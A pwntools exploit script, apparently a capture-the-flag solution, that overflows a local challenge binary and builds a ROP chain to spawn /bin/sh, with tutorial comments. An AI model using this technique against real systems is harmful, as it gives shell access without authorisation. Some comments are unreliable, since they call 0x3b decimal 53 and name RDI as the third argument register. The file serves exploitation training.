#!/bin/python3

from pwn import *
context(arch="amd64")

p = process('./pwne')
elf = ELF('./pwne')

# Step 1 - Finding gadgets
# In order to get a shell, we'll have to execute "execve('/bin/sh', 0, 0)"
# "execve" corresponds to a "syscall" instruction that we'll have to find + RAX register loaded with code "dec 53" = 0x3b
# You can see all syscalls here: https://filippo.io/linux-syscall-table/

# So basically: we find a "syscall" instruction and initialize RAX to 0x3b to execute a "execve()"
# Once it's done we have to initialize 3 arguments of execve(), as you can see here: https://en.wikipedia.org/wiki/X86_calling_conventions#System_V_AMD64_ABI
# --> in x86-64 Unix/Linux calling convention, 1st arg is RDI, 2nd arg is RSI and 3rd arg is RDI
# So we find a way to set RDI to the address of '/bin/sh' to perform "execve('/bin/sh')"
# Then we find a way to set RSI and RDX to 0 to perform "execve('/bin/sh', 0, 0)" --> boom, we've got a shell!

# Find a sycall gadget: ropper -f pwne --search "syscall"
# --> 0x463355: syscall; ret;
syscall_gadget = 0x463355

# Find a way to control RAX: ropper -f pwne --search "pop rax"
# --> 0x40944c: pop rax; ret;
pop_rax_gadget = 0x40944c

# Same principle for RDI, RSI and RDX...
pop_rdi_gadget = 0x401716
pop_rsi_gadget = 0x4068c8
pop_rdx_gadget = 0x43ce75

# And then we find the address of the global string '/bin/sh' given to us by the chall-maker. We can do so with: strings -tx pwne |grep '/bin/sh'
# We receive the address/offset "+0x7d004", but as this binary will be mapped at 0x400000 the string will be at address 0x47d004
# But we can also do it with PwnTools, this is what we will do here
bin_sh_addr = next(elf.search(b'/bin/sh'))

# Step 2 - Constructing the payload

payload = b'A'*24

payload += p64(pop_rax_gadget)
payload += p64(0x3b) # pop 0x3b to RAX

payload += p64(pop_rdi_gadget)
payload += p64(bin_sh_addr) # pop the address of '/bin/sh' to RDI

payload += p64(pop_rsi_gadget)
payload += p64(0x0) # pop 0 to RSI

payload += p64(pop_rdx_gadget)
payload += p64(0x0) # pop 0 to RDX

payload += p64(syscall_gadget) # jump to the syscall gadget

print(p.recvline())
p.sendline(payload)
p.interactive()
